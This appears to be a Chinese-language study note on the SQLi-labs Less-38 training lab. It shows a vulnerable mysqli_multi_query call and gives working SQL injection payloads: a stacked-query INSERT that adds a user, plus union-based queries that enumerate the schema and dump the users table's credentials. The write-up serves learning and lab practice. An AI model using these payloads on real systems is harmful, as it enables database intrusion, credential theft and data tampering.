---
title: less38
url: https://www.yuque.com/u29002979/ep2zrx/cup2xex5a1s03t2k
---

```bash
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
/* execute multi query */
if (mysqli_multi_query($con1, $sql))
```

** mysqli\_multi\_query()**这个函数可以实现针对数据库一条或多多条数据的操作
这就导致可能产生**堆叠注入**的存在，
堆叠注入可以实现**数据的增删改查**，木马的写入，甚至直接破坏,升格数据库 <a name="cmHrI"></a>

# 堆叠注入

插入一条数据在users字段中,两条不同sql语句用 分号隔开 **；**&#x20;
`?id=1'**;** insert into users(username,password)values('duidie','duidiezhuru')--+` &#x20;
&#x20;数据插入后页面没有回显，通过查询查看
`id=-1' union select 1,2,(select group_concat(username,0x7e,password)from users)--+`

> Your Username is : 2
> Your Password is : Dumb~Dumb,Angelina~I-kill-you,Dummy~p@ssword,secure~crappy,stupid~stupidity,superman~genious,batman~mob!le,admin~1234,admin1~admin1,admin2~admin2,admin3~admin3,dhakkan~dumbo,admin4~admin4,admin'-- +~123456,duidie~duidiezhuru

添加数据成功 <a name="bzYh1"></a>

# 注入点测试

`?id=1'`

> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1

单引号'闭合 <a name="PF74E"></a>

# 联合查询

```bash
判断字段数 
?id=1' order by 4--+ 
?id=1' order by 3--+

找回显点
?id=-1' union select 1,2,3--+  

爆破数据库名称
?id=-1' union select 1,2,database()--+

爆破数据库表名称
?id=-1' union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+

爆破字段名称
?id=-1' union select 1,2,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name='users'--+

爆破字段内容
?id=-1' union select 1,2,(select group_concat(username,0x7e,password) from users)--+
```
